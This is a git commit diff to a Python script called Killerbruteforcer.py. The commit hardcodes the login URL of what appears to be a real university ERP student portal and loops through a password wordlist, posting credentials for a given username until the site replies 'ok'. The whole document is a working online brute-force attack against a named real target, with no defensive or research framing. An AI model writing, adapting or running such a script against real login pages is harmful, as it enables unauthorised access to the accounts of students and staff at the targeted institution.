f02b8fcc8f16d0d756c545e1f8b3424b3bc4304b
0xmk4y <bismarck.a360@gmail.com>
2022-12-05 10:02:16 +0000

    update

--- Killerbruteforcer.py
+++ Killerbruteforcer.py
@@ -3,17 +3,16 @@ import argparse
 
 
 parser = argparse.ArgumentParser()
-parser.add_argument('--url', type=str, required=True)
-parser.add_argument('--username', type=str, required=True)
-parser.add_argument('--wordlist', type=str, required=True)
+parser.add_argument('--username','-u', type=str, required=True)
+parser.add_argument('--wordlist','-w', type=str, required=True)
 
 args = parser.parse_args()
 
-url = args.url
 
 username = args.username
 
 wordlists_path = args.wordlist
+url = 'https://erp.gctu.edu.gh/sip/auth/login.php'
 
 
 
@@ -23,8 +22,7 @@ with open(wordlists_path) as wordlists:
         for passwd in wordlists:
             data = {'username':username, 'password':passwd}
             r = requests.post(url, data=data)
-            if 'ok'.encode() in r.content:
-                print(r.text)
+            if r.text == 'ok':
                 print("Password found:%s" %(passwd))
                 break
             else:
